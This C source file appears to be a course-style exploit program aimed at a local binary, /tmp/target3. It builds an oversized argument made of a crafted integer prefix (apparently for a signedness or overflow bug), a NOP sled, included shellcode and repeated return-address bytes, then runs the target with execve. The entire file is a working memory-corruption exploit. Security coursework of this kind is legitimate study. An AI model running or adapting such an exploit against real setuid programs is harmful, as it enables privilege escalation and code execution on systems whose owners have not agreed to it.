#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target3"

int main(void)
{
  char *args[3];
  char *env[1];

  args[0] = TARGET; args[1] = "hi there"; args[2] = NULL;
  env[0] = NULL;

  char *str = (char *) malloc(60000);
  int i = 0;
  memcpy(str, "2147483648", 11);

  str[0] = '2';
  str[1] = '1';
  str[2] = '4';
  str[3] = '7';
  str[4] = '4';
  str[5] = '8';
  str[6] = '4';
  str[7] = '5';
  str[8] = '7';
  str[9] = '5';
  str[10] = ',';
  i = 11;
  while (i < 30000) {
    str[i++] = '\x90';
  }

  int j = 0;
  int len = strlen(shellcode);

  while (i < 60000) {
    for (j = 0; j < len; j) {
      str[i++] = shellcode[j++];
    }
    break;
  }

  while (i < 60000) {
    str[i++] = '\xfe';
    str[i++] = '\xbf';
    str[i++] = '\x90';
    str[i++] = '\x31';
  }

  args[1] = str;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
